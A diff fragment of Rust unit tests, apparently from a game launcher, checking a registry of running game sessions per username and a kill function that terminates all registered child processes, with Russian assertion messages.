+    fn registry_removal_only_accepts_own_handle() {
+        let _guard = KILL_TEST_LOCK.lock().unwrap_or_else(|e| e.into_inner());
+        reset_registry();
+
+        let registered =
+            register_game_session(spawn_helper(), "Steve").expect("первая регистрация");
+        let foreign = Arc::new(StdMutex::new(spawn_helper()));
+
+        remove_game_session(&foreign);
+        assert!(game_running(), "чужой хендл не должен очищать реестр");
+
+        remove_game_session(&registered);
+        assert!(!game_running(), "свой хендл очищает реестр");
+
+        let _ = lock_child(&registered).kill();
+        let _ = lock_child(&foreign).kill();
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn same_username_registration_returns_orphan_for_cleanup() {
+        let _guard = KILL_TEST_LOCK.lock().unwrap_or_else(|e| e.into_inner());
+        reset_registry();
+
+        let first = register_game_session(spawn_helper(), "Steve").expect("первая регистрация");
+
+        let mut orphan = register_game_session(spawn_helper(), "Steve")
+            .expect_err("второй процесс того же аккаунта должен отклоняться");
+        let _ = orphan.kill();
+        let _ = orphan.wait();
+
+        let second =
+            register_game_session(spawn_helper(), "Alex").expect("другой аккаунт регистрируется");
+
+        assert_eq!(game_usernames().len(), 2, "реестр держит обе сессии");
+
+        let _ = lock_child(&first).kill();
+        let _ = lock_child(&second).kill();
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn kill_terminates_all_registered_processes() {
+        let _guard = KILL_TEST_LOCK.lock().unwrap_or_else(|e| e.into_inner());
+        reset_registry();
+
+        let first = Arc::new(StdMutex::new(spawn_helper()));
+        let second = Arc::new(StdMutex::new(spawn_helper()));
+        {
+            let mut registry = GAME_SESSIONS.lock().unwrap_or_else(|e| e.into_inner());
+            registry.push(super::RegisteredGame {
+                child: Arc::clone(&first),
+                username: "Steve".to_string(),
+            });
+            registry.push(super::RegisteredGame {
+                child: Arc::clone(&second),
+                username: "Alex".to_string(),
+            });
+        }
 
         kill_game_process().expect("принудительное завершение должно срабатывать");
 
-        let mut exit_status = None;
+        for child in [&first, &second] {
+            let mut exited = false;
+            for _ in 0..50 {
+                let status = lock_child(child)
+                    .try_wait()
+                    .expect("опрос статуса процесса");
+                if status.is_some() {
+                    exited = true;
+                    break;
+                }
+                std::thread::sleep(Duration::from_millis(100));
+            }
+            assert!(exited, "оба процесса должны завершиться после kill");
+        }
+        assert!(game_running(), "реестр очищают wait-потоки, а не сам kill");
+
+        reset_registry();
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn kill_continues_past_already_exited_session() {
+        let _guard = KILL_TEST_LOCK.lock().unwrap_or_else(|e| e.into_inner());
+        reset_registry();
+
+        let exited = register_game_session(
+            std::process::Command::new("sleep")
+                .arg("0")
+                .spawn()
+                .expect("запуск короткоживущего процесса"),
+            "Steve",
+        )
+        .expect("регистрация завершившейся сессии");
+        lock_child(&exited)
+            .wait()
+            .expect("естественный выход первой игры");
+
+        let live = Arc::new(StdMutex::new(spawn_helper()));
+        {
+            let mut registry = GAME_SESSIONS.lock().unwrap_or_else(|e| e.into_inner());
+            registry.push(super::RegisteredGame {
+                child: Arc::clone(&live),
+                username: "Alex".to_string(),
+            });
+        }
+
+        kill_game_process()
+            .expect("уже завершившаяся сессия не должна прерывать завершение остальных сессий");
+
+        let mut gone = false;
         for _ in 0..50 {
-            if let Some(status) = child.try_wait().expect("опрос статуса процесса")
+            if lock_child(&live)
+                .try_wait()
+                .expect("опрос статуса процесса")
+                .is_some()
             {
-                exit_status = Some(status);
+                gone = true;
                 break;
             }
             std::thread::sleep(Duration::from_millis(100));
         }
-        let status = exit_status.expect("процесс должен завершиться после kill");
         assert!(
-            !status.success(),
-            "SIGKILL не даёт успешный статус завершения"
-        );
-        assert_eq!(
-            current_game_pid(),
-            Some(pid),
-            "реестр очищает wait-поток, а не сам kill"
+            gone,
+            "живая сессия после уже завершившейся должна быть завершена"
         );
 
-        reset_game_pid();
+        remove_game_session(&exited);
+        remove_game_session(&live);
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn kill_after_natural_exit_is_not_an_error() {
+        let _guard = KILL_TEST_LOCK.lock().unwrap_or_else(|e| e.into_inner());
+        reset_registry();
+
+        let shared = register_game_session(
+            std::process::Command::new("sleep")
+                .arg("0")
+                .spawn()
+                .expect("запуск короткоживущего процесса"),
+            "Steve",
+        )
+        .expect("регистрация");
+
+        let status = lock_child(&shared)
+            .wait()
+            .expect("естественный выход процесса");
+        assert!(status.success());
+
+        kill_game_process().expect(
+            "kill по уже завершившейся игре не должен давать ошибку и не должен бить по чужому процессу",
+        );
+
+        remove_game_session(&shared);
     }
 }
